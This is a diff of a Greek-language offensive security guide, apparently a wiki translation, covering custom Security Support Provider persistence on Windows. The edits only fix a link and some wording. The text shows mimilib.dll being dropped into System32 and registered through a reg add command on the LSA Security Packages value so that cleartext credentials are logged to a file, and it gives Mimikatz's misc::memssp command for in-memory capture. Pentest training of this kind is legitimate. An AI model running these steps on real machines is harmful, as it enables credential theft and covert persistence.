@@ -4,12 +4,12 @@
 
 ### Custom SSP
 
-[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
 Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράψετε** σε **καθαρό κείμενο** τα **διαπιστευτήρια** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.
 
 #### Mimilib
 
-Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
+Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει μέσα σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
 Ρίξτε το dll στο `C:\Windows\System32\`\
 Πάρτε μια λίστα με τα υπάρχοντα LSA Security Packages:
 ```bash:attacker@target
@@ -31,7 +31,7 @@ reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 privilege::debug
 misc::memssp
 ```
-Αυτό δεν θα επιβιώσει από επανεκκινήσεις.
+Αυτό δεν θα επιβιώσει σε επανεκκινήσεις.
 
 #### Μετριασμός
 
